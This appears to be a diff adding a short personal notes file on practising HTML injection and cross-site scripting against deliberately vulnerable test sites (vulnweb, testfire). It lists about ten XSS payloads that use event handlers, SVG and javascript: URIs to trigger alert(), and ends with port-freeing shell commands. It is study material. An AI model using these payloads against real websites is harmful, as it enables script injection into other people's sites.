@@ -1,0 +1,20 @@
+website: http://testphp.vulnweb.com/userinfo.php (type php login test page)
+login using 'test' username and 'test' password and in username section
+enter <a href="https://www.google.com">HTML</a> and update
+creates hyperlink to google
+
+Website testfire.net
+
+<x contenteditable onkeydown=alert(1)>press any key!
+<x onmousedown=alert(1)>click this! 
+<x onmousemove=alert(1)>hover this! 
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+alert&lpar;1&rpar;
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
+<html ontouchstart=alert(1)> 
+<form action=javascript:alert(1)><input type=submit>
+<area onmousemove="alert(1)">test</area>
+<address ondblclick="alert(1)">test</address>
+
+sudo netstat -tulnp | grep ':8080'
+sudo kill number
